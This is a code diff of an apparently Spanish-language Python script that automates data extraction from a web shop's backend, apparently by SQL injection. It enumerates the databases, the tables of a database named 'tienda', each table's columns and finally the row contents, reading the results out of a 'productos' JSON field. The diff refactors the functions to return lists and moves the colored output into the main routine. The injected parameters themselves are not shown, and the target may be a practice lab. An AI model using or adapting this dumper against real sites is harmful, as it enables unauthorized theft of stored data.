@@ -21,7 +21,9 @@ def dump_databases():
     r = requests.get(url, params=params)
     data = r.json()
     data = data["productos"][-1][2]
-    print(colored(f"\n[*] Bases de datos extraidas: {data}\n", 'green'))
+
+    databases = data.split(',')
+    return databases
 
 # Extrae todas las tablas de una base de datos
 def dump_tables(database):
@@ -32,7 +34,6 @@ def dump_tables(database):
     r = requests.get(url, params=params)
     data = r.json()
     data = data["productos"][-1][2]
-    print(colored(f"\n[*] Tablas extraidas de la base de datos '{database}': {data}\n", 'yellow'))
 
     tables = data.split(',')
     return tables
@@ -46,7 +47,6 @@ def dump_columns(database,table):
     r = requests.get(url, params=params)
     data = r.json()
     data = data["productos"][-1][2]
-    print(colored(f"\n[*] Columnas extraidas de la tabla '{table}' de la base de datos '{database}': {data}\n", 'magenta'))
 
     columnas = data.split(',')
     return columnas
@@ -61,13 +61,22 @@ def dump_data(database, table, columns):
     r = requests.get(url, params=params)
     data = r.json()
     data = data["productos"][-1][2]
-    print(colored(f"\n[*] Contenido extraido de la tabla '{table}' de la base de datos '{database}': {data}\n", 'blue'))
+
+    content = data.split(',')
+    return content
 
 
 if __name__ == '__main__':
-    dump_databases()
+    databases = dump_databases()
+    print(colored(f"\n[*] Bases de datos extraidas: {databases}\n", 'green'))
     database = 'tienda'
+    print(colored(f"\n[i] Enumerando la base de datos '{database}':\n", 'red'))
     tables = dump_tables(database)
+    print(colored(f"\n[*] Tablas extraidas: {tables}\n", 'yellow'))
     for table in tables:
+        print("-------------------------------------------------------------------------------------------------------------------------------------------")
+        print(colored(f"\n[i] Enumerando la tabla '{table}':\n", 'red'))
         columns = dump_columns(database, table)
-        dump_data(database, table, columns)
+        print(colored(f"\n[*] Columnas extraidas : {columns}\n", 'magenta'))
+        content = dump_data(database, table, columns)
+        print(colored(f"\n[*] Contenido extraido : {content}\n", 'blue'))
